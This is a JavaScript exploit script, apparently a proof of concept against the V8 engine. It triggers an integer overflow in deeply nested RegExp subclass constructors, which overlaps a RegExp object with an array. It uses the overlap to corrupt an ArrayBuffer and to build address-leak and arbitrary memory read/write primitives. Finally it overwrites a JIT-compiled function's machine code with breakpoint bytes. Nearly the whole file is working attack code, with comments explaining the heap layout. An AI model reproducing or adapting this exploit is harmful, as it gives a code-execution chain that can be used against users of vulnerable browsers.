function gc() {
	for (var i = 0; i < 0x10000; ++i) {
		new String();
	}
}

function hex8(value) {
	return value.toString(16).padStart(2, '0');
}

function hex16(value) {
	return value.toString(16).padStart(4, '0');
}

function hex32(value) {
	return value.toString(16).padStart(8, '0');
}

function hexdump(view) {
	output = '';
	ascii = '';
	for (var i = 0; i < view.byteLength; ++i) {
		if (i % 16 == 0) {
			output += hex16(i) + ':  ';
		}
		byte = view.getUint8(i);
		output += hex8(byte) + ' ';
		if (0x20 <= byte && byte <= 0x7e) {
			ascii += String.fromCharCode(byte);
		} else {
			ascii += '.';
		}

		if (i % 16 == 15) {
			output += ' ' + ascii + '\n';
			ascii = '';
		}
	}

	if (i % 16 != 15) {
		for (var j = i % 16; j < 16; ++j) {
			output += '   ';
		}
		output += ' ' + ascii + '\n';
	}

	return output;
}

function print(str) {
	console.log(str.toString());
}

function pointer(hi, lo) {
	this.hiword = hi;
	this.loword = lo;

	this.toString = function() {
		return '0x' + hex32(this.hiword) + hex32(this.loword);
	}

	this.add = function(offset) {
		return new pointer(this.hiword, this.loword + offset);
	}

	return this;
}

function oob_access() {
	this.buffer = null;
	this.buffer_view = null;

	this.page_ptr = null;
	this.page_buffer = null;
	this.page_view = null;

	const kLengthOffset = 0x17;
	const kBufferOffset = 0x1f;
	const kSlotOffset = 0x4f;

	(function trigger() {
		// So, we target the integer overflow to create a JSRegExp object with an
		// instance_size of 8, and overlap this allocation with a JSArray object.
		//
		//       JSRegExp              JSArray
		// 0000: map
		// 0008: properties_or_hash    map
		// 0010: elements              properties_or_hash
		// 0018: data                  elements              <--- corrupt
		// 0020: source                length                <--- corrupt
		// 0028: flags
		// 0030: size
		// 0038: last_index
		//
		// The created JSRegExp object will be completely broken, but this doesn't
		// matter - we will allocate the overlapping JSArray inside the constructor
		// call before initialisation is finished, and during the initialisation of
		// the regular expression, data and source will be written to, corrupting
		// the elements and length fields of the array.
		//
		// We'll then quickly use this to modify an array buffer, and avoid holding
		// references to either the JSRegExp or the JSArray (since both have highly
		// invalid sizes) so that neither will be tenured when a gc triggers.

		class LeakArrayBuffer extends ArrayBuffer {
			constructor() {
				super(0x1000);
				this.slot = this;
			}
		}

		this.page_buffer = new LeakArrayBuffer();
		gc();

		const derived_n = eval(`(function derived_n(i) {
			if (i == 0) {
				class Derived extends RegExp {
					constructor(e) {
						super(e);
						return;
						${"this.a=0;".repeat(0x7fffb-8)}
					}
				}

				return Derived;
			}

			class DerivedN extends derived_n(i-1) {
				constructor(e) {
					super(e);
					return;
					${"this.a=0;".repeat(0x80000-8)}
				}
			}

			return DerivedN;
		})`);

		const ctor = derived_n(0x3ff);

		var array = null;
		var pattern = new Object();
		pattern.toString = function() {
			// This is the allocation of the overlapping JSArray object. While this
			// allocation is referenced, a garbage collection will crash!
			array = new Array(8);
			return 'c01db33f';
		}

		// This is the allocation of the overlapping JSRegExp object which will 
		// corrupt the array; we never hold a reference to it (except the 'this'
		// reference during construction)
		new ctor(pattern);
		this.buffer = new ArrayBuffer(0x80);
		array[12] = this.page_buffer;
		array = null;
		// If we made it to here, we're safe.

		this.buffer_view = new DataView(this.buffer);
		this.page_ptr = new pointer(this.buffer_view.getUint32(kBufferOffset + 4, true),
			                          this.buffer_view.getUint32(kBufferOffset, true));
		this.page_view = new DataView(this.page_buffer);
	})();

	this.leakPtr = function(obj) {
		print(hexdump(this.buffer_view));
		this.page_buffer.slot = obj;
		print(hexdump(this.buffer_view));
		return new pointer(this.buffer_view.getUint32(kSlotOffset + 4, true),
			                 this.buffer_view.getUint32(kSlotOffset, true) & 0xfffffffe);
	}

	this.castPtr = function(ptr) {
		this.buffer_view.setUint32(kSlotOffset + 4, ptr.hiword, true);
		this.buffer_view.setUint32(kSlotOffset, ptr.loword | 1, true);
		return this.page_buffer.slot;
	}

	this.setPagePtr = function(ptr) {
		this.buffer_view.setUint32(kBufferOffset, ptr.loword, true);
		this.buffer_view.setUint32(kBufferOffset + 4, ptr.hiword, true);
		this.page_ptr = ptr;
		this.page_view = new DataView(this.page_buffer);
	}

	this.getUint8 = function(ptr) {
		var offset = ptr.loword - this.page_ptr.loword
		if (ptr.hiword == this.page_ptr.hiword
			  && offset >= 0 && offset <= (0x1000 - 1)) {
			return this.page_view.getUint8(offset);
		}

		this.setPagePtr(ptr);
		return this.getUint8(ptr);
	}

	this.getUint16 = function(ptr) {
		var offset = ptr.loword - this.page_ptr.loword
		if (ptr.hiword == this.page_ptr.hiword
			  && offset >= 0 && offset <= (0x1000 - 2)) {
			return this.page_view.getUint16(offset, true);
		}

		this.setPagePtr(ptr);
		return this.getUint16(ptr);
	}

	this.getUint32 = function(ptr) {
		var offset = ptr.loword - this.page_ptr.loword
		if (ptr.hiword == this.page_ptr.hiword
			  && offset >= 0 && offset <= (0x1000 - 4)) {
			return this.page_view.getUint32(offset, true);
		}

		this.setPagePtr(ptr);
		return this.getUint32(ptr);
	}

	this.getPtr = function(ptr) {
		var offset = ptr.loword - this.page_ptr.loword
		if (ptr.hiword == this.page_ptr.hiword
			  && offset >= 0 && offset <= (0x1000 - 8)) {
			return new pointer(this.page_view.getUint32(offset + 4, true),
			                   this.page_view.getUint32(offset, true));
		}

		this.setPagePtr(ptr);
		return this.getPtr(ptr);
	}

	this.setUint8 = function(ptr, value) {
		var offset = ptr.loword - this.page_ptr.loword
		if (ptr.hiword == this.page_ptr.hiword
			  && offset >= 0 && offset <= (0x1000 - 1)) {
			return this.page_view.setUint8(offset, value);
		}

		this.setPagePtr(ptr);
		return this.setUint8(ptr, value);
	}

	this.setUint16 = function(ptr, value) {
		var offset = ptr.loword - this.page_ptr.loword
		if (ptr.hiword == this.page_ptr.hiword
			  && offset >= 0 && offset <= (0x1000 - 2)) {
			return this.page_view.setUint16(offset, value, true);
		}

		this.setPagePtr(ptr);
		return this.setUint16(ptr, value);
	}

	this.setUint32 = function(ptr, value) {
		var offset = ptr.loword - this.page_ptr.loword
		if (ptr.hiword == this.page_ptr.hiword
			  && offset >= 0 && offset <= (0x1000 - 4)) {
			return this.page_view.setUint32(offset, value, true);
		}

		this.setPagePtr(ptr);
		return this.setUint32(ptr, value);
	}

	this.setPtr = function(ptr, value) {
		var offset = ptr.loword - this.page_ptr.loword
		if (ptr.hiword == this.page_ptr.hiword
			  && offset >= 0 && offset <= (0x1000 - 8)) {
			this.page_view.setUint32(offset + 4, value.hiword, true);
			return this.page_view.setUint32(offset, value.loword, true);
		}

		this.setPagePtr(ptr);
		return this.setPtr(ptr, value);
	}

	return this;
}

(function () {
	var oob = oob_access();
	print(hexdump(oob.buffer_view));

	var a = (function (value) {
		if (value) {
			console.log('hello');
		}
	});

	for (var i = 0; i < 0x10000; ++i) {
		a(false);
	}

	obj_ptr = oob.leakPtr(a);
	print(obj_ptr);
	oob.setPagePtr(obj_ptr);
	print(hexdump(new DataView(oob.page_buffer, 0, 0x100)));

	code_ptr = oob.getPtr(obj_ptr.add(0x20));
	print(code_ptr);
	oob.setPagePtr(code_ptr);
	print(hexdump(new DataView(oob.page_buffer, 0, 0x100)));

	jit_ptr = oob.getPtr(code_ptr.add(0x7));
	print(jit_ptr);
	oob.setPagePtr(jit_ptr);
	print(hexdump(new DataView(oob.page_buffer, 0, 0x400)));

	alert(1);

	for (var i = 0; i < 0x80; ++i) {
		oob.setUint8(jit_ptr.add(0x5f + i), 0xcc);
	}

	a(false);

})();